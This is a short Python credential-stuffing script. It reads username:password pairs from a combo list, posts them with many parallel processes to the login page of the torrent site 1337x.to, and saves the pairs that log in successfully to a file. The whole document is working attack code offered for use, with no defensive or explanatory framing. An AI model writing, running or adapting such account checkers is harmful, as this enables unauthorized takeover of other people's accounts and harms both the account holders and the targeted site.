import requests
import time
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support

accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
working = []

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://1337x.to',
    'Connection': 'keep-alive',
    'Referer': 'https://1337x.to/login',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}

def loginData(username, password):
    return {
        'username': username,
        'password': password,
        'submit': 'Login'
    }

def checkAccount(account):
    username = account.split(':')[0]
    password = account.split(':')[1]
    response = requests.post('https://1337x.to/login', headers=headers, data=loginData(username, password))
    if "Successful login" in response.text:
        print(f"[Good Account] - {account}")
        working.append(account)
        with open('working.txt', 'a') as f:
            f.write("%s\n" % account)
        return True
    elif "Bad Login." in response.text:
        print(f"[Bad Password] - {account}")
        return False
    elif "Bad Username." in response.text:
        print(f"[Bad Account] - {account}")
        return False
    else:
        print(response.text)

def main():
    numThreads = input("How many threads would you like to use? ")
    freeze_support()

    pool = Pool(int(numThreads))
    pool.map(checkAccount, accounts)

    pool.close()
    pool.join()
main()
